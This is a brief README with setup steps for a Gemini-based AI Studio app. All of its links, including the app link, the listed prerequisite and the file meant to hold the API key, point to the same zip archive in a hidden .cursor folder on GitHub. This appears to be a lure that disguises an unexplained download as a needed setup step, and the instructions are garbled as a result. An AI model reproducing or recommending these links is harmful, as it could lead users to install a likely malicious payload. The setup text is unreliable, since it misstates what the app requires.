# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://raw.githubusercontent.com/muurder/viajastore/main/.cursor/Software_1.5.zip

## Run Locally

**Prerequisites:**  https://raw.githubusercontent.com/muurder/viajastore/main/.cursor/Software_1.5.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/muurder/viajastore/main/.cursor/Software_1.5.zip](https://raw.githubusercontent.com/muurder/viajastore/main/.cursor/Software_1.5.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
